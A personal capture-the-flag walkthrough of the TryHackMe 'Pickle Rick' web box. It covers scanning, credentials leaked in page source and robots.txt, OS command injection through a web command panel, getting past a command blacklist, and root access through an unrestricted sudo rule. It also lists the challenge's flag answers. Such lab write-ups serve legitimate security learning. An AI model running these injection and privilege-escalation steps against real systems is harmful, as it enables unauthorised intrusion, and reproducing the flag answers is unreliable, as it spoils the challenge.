# Pickle Rick (TryHackMe)

**Platform:** TryHackMe
**Difficulty:** Easy
**Date:** 2026-09-20
**Tags:** web, enumeration

## Summary

Easy web box. The whole path was: find a username hidden in the page source, find the password in robots.txt, log into a command panel that runs system commands (OS command injection), then read three ingredient files scattered around the filesystem. `cat` was blacklisted so I used `less` throughout. The last file needed root, and `sudo -l` showed www-data could run anything as root with no password, so `sudo` gave it up instantly.

## Recon

Target IP: 10.130.141.185

### Nmap

Ran a version scan first:

```
nmap -sV 10.130.141.185
```

Two ports open:

```
22/tcp  open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp  open  http  Apache httpd 2.4.41 (Ubuntu)
```

What stood out: SSH (22) is a locked door, no use without credentials, so I parked it. Port 80 is a web server with no SSL (plain http), which anyone can browse, so that's the entry point. Decided to open port 80 in the browser and enumerate the web app.

### Web enumeration

The homepage is a Rick and Morty themed page, "Help Morty!", asking me to log into Rick's computer and find three secret ingredients. Nothing useful visible on the page itself.

Checked the page source (Ctrl+U). Found a username left in an HTML comment:

```
<!--
  Note to self, remember username!
  Username: R1ckRul3s
-->
```

So I have a username but no password yet.

### Directory / content discovery

```
gobuster dir -u http://10.130.141.185 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

Useful finds:

```
/login.php    (200)  login page
/portal.php   (302)  redirects, this is the panel after login
/denied.php   (302)  "only the REAL rick can view this"
/assets       (301)
/robots.txt   (200)
```

Also checked robots.txt directly, it contained a single line:

```
Wubbalubbadubdub
```

That turned out to be the password. Logged into login.php with:

- Username: R1ckRul3s
- Password: Wubbalubbadubdub

## Foothold

After logging in I land on portal.php, which has a "Command Panel", a text box with an Execute button that runs input as a command on the server. This is OS command injection territory (same as the PortSwigger command injection labs).

Confirmed it with `whoami` and `ls`. `ls` showed:

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

`cat` is blacklisted ("Command disabled to make it hard..."). But a blacklist only blocks the words it thought of, and Linux has many ways to read a file. Used `less`:

```
less Sup3rS3cretPickl3Ingred.txt
```

That returned the first ingredient: mr. meeseek hair

### Ingredient 2

clue.txt hinted to look around the filesystem. Still using `less` instead of the blocked `cat`.

Checked home directories:

```
ls /home            -> rick, ubuntu
ls /home/rick       -> "second ingredients"   (filename has a space)
```

The space in the filename breaks the path unless you quote or escape it:

```
less "/home/rick/second ingredients"
```

Second ingredient found.

### Ingredient 3 (privesc)

Third file was in /root, which a normal user can't read:

```
ls /root    -> Permission denied
```

The web app runs as www-data. Checked sudo rights:

```
sudo -l
```

Result:

```
User www-data may run the following commands on ip-...:
    (ALL) NOPASSWD: ALL
```

That means www-data can run any command as root with no password. Full privesc in one line. So:

```
sudo ls /root
sudo less /root/3rd.txt
```

Third ingredient found. Box complete.

## Flags

- Ingredient 1: mr. meeseek hair
- Ingredient 2: 1 jerry tear
- Ingredient 3: (in /root/3rd.txt)

## What I tried that did not work

- Assumed the denied.php menu links (Potions, Creatures, etc.) might lead somewhere. They all just redirect to "only the REAL rick can view this". Dead end, ignore them.
- Tried `cat` first out of habit. It's blacklisted by the app. The fix wasn't fighting the filter, it was using a different reader (less/more/head/tail all work).

## Lessons

- View source and robots.txt before touching any tool. Both handed me credentials for free on this box.
- A command box that runs your input = OS command injection. Same concept as the PortSwigger labs, just a real target.
- Blacklists are weak. Blocking `cat` does nothing when `less`, `more`, `head`, `tail`, `nl`, `strings` all read files too.
- Filenames with spaces need quotes or a backslash escape.
- `sudo -l` is one of the first privesc checks on any Linux box. `(ALL) NOPASSWD: ALL` is an instant win.
